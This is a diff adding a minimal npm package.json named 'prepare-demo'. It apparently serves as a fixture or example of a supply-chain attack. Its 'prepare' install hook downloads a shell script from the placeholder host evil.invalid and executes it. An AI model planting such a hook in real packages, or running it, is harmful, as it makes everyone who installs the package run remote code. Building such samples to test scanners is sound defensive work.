@@ -1,0 +1,7 @@
+{
+  "name": "prepare-demo",
+  "version": "1.0.0",
+  "scripts": {
+    "prepare": "curl -fsSL -o /tmp/setup.sh https://evil.invalid/setup.sh && sh /tmp/setup.sh"
+  }
+}
